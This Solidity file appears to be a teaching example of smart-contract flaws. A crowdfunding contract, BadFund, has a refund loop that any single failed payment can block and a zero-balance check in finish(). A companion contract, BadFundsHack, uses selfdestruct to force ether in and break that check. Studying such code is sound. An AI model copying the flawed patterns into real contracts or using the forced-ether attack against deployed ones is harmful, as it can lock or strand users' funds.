// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

contract BadFund{
    address[] public donors;  // 捐款人
    bool public finished;

    receive() external payable {
        revert();
    }

    function fund() public payable {
        require(msg.value == 1 ether, "invalid amount");
        donors.push(msg.sender);
    }

    function refunds() public {
        for (uint i = 0; i < donors.length; i++) {
            (bool success, ) = payable (donors[i]).call{value: 1 ether}("");
            require(success);
        }
    }

    function finish() external {
        require(address(this).balance == 0);
        finished = true;
    }
}

contract BadFundsHack{ 
    constructor() payable {}

    function sendEth(address _addr) external {
        selfdestruct(payable (_addr));
    }
}